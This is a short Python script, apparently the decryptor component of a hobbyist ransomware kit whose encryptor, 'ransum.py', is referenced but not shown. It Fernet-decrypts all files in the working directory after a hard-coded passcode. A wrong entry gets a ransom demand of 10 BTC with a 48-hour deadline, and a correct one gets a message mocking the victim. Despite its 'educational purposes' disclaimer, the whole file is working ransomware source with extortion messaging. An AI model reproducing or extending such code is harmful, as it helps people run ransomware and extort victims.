#[!] DISCLAIM-R: performing hacking attempts on computers that you do not own (without permission) is illegal!

# import os and Fernet

import os
from cryptography.fernet import Fernet

# locate files to decrypt using for loop (conditionals used to avoid ransum, key & directories)

target_files = []

for target_file in os.listdir():
        if target_file == "ransum.py" or target_file == "encryption_key.key" or target_file == "decrypt-r.py":
                continue
        if os.path.isfile(target_file):
                target_files.append(target_file)

print(target_files)

# read encryption_key file and save key to variable

with open("encryption_key.key", "rb") as key:
        decrypt_key = key.read()


    # set passcode to run decryption

passcode = "decrypt-r"


# print banner

print('''
                                                                                         
    ██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗   ██████╗ 
    ██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝   ██╔══██╗
    ██║  ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║█████╗██████╔╝
    ██║  ██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║╚════╝██╔══██╗
    ██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║      ██║  ██║
    ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝      ╚═╝  ╚═╝
                                                                                         

decrypt-r v.1. ethical hacking tool - for educational purposes ONLY

[!] DISCLAIM-R: performing hacking attempts on computers that you do not own (without permission) is illegal!

''')


# ask user to input passcode and verify if input passcode is correct

user_input = input("Enter the passcode to start Decrypt-R and decrypt your files: ")

if user_input == passcode:

# decrypt files using a for loop if user provides correct passcode

        for target_file in target_files:
                with open(target_file, "rb") as  victim_file:
                        file_contents = victim_file.read()
                decrypted_contents = Fernet(decrypt_key).decrypt(file_contents)
                with open(target_file, "wb") as victim_file:
                        victim_file.write(decrypted_contents)
        print("Smart choice - your files have been decrypted. Pleasure doing business with you.")
        
# do not decrypt is user does not provide incorrect passcode
else:
        print("Sorry, incorrect passcode. Decryption passcode costs 10 BTC. You have 48 hrs, time is ticking...")

